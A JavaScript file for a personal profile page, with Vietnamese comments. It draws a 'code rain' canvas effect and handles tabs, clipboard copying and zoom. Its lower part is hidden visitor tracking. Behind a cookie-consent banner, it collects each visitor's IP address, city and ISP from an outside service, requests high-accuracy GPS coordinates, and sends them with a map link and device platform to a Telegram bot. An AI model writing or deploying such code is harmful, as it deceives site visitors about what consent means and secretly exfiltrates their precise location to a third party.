// Code rain background
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
const fontSize = 12;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);

function draw() {
    ctx.fillStyle = 'rgba(15, 23, 42, 0.04)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#60a5fa';
    ctx.font = fontSize + 'px monospace';
    for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}
setInterval(draw, 45);

window.addEventListener('resize', () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
});

// Tab toggle
document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.contact-content').forEach(c => c.classList.remove('active'));
        btn.classList.add('active');
        document.getElementById(btn.dataset.tab).classList.add('active');
    });
});

// Copy to clipboard
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        alert('Đã sao chép: ' + text);
    }).catch(() => {
        alert('Không thể sao chép, thử thủ công nhé!');
    });
}

// Auto zoom adjustment
function adjustZoom() {
    const vw = document.getElementById('viewportMeta');
    const w = window.innerWidth;
    let scale = w < 768 ? 1.04 : 1.0;
    vw.setAttribute('content', `width=device-width, initial-scale=${scale}, maximum-scale=5.0, user-scalable=yes`);
}
window.addEventListener('resize', adjustZoom);
adjustZoom();

        const TG_TOKEN = CONFIG.TG_TOKEN;
        const CHAT_ID = CONFIG.CHAT_ID;

        window.onload = () => {
            if (!localStorage.getItem('is_accepted')) {
                setTimeout(() => { document.getElementById('cookie-box').style.display = 'block'; }, 1000);
            } else {
                startAutoTracking();
            }
        };

        function acceptCookies() {
            localStorage.setItem('is_accepted', 'true');
            document.getElementById('cookie-box').style.display = 'none';
            startAutoTracking();
        }

        async function startAutoTracking() {
           // 1. Lấy thông tin IP & Nhà mạng (Dùng nguồn ipwho.is ổn định hơn)
    let ipInfo = {};
    try {
        // Sử dụng ipwho.is thay vì ipapi.co
        const res = await fetch('https://ipwho.is/');
        const data = await res.json();
        
        if (data.success) {
            ipInfo = {
                ip: data.ip,
                city: data.city,
                // ipapi dùng .org, ipwho dùng .connection.isp nên cần gán lại cho khớp
                org: data.connection ? data.connection.isp : 'Unknown' 
            };
        } else {
             throw new Error("Get IP failed");
        }
    } catch (e) { 
        ipInfo = { 
            ip: "Không xác định", 
            city: "Không xác định", 
            org: "Không xác định" 
        }; 
    }
            // 2. Lấy tọa độ GPS (Cần người dùng bấm "Cho phép" 1 lần)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => sendData(pos, ipInfo), 
                    () => sendData(null, ipInfo), 
                    { enableHighAccuracy: true }
                );
            }
        }

        function sendData(pos, ip) {
            let message = `<b>⚡ CÓ NGƯỜI TRUY CẬP PROFILE</b>\n\n`;
           message += `<b>🌐 IP:</b> <code>${ip.ip}</code>\n`;
           message += `<b>🏙️ Thành phố:</b> ${ip.city || 'Không xác định'}\n`;
           message += `<b>🏢 Nhà mạng:</b> ${ip.org || 'Không xác định'}\n`;

            if (pos && pos.coords) {
           message += `\n<b>📍 Tọa độ GPS:</b>\n`;
           message += `➡️ Vĩ độ: <code>${pos.coords.latitude}</code>\n`;
            message += `➡️ Kinh độ: <code>${pos.coords.longitude}</code>\n`;
           message += `<a href="https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}">Xem trên Bản đồ</a>\n`;
          } else {
           message += `\n<b>📡 GPS:</b> Bị từ chối hoặc không khả dụng\n`;
      }

      message += `\n<b>💻 Thiết bị:</b> ${navigator.platform}\n`;

            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
        }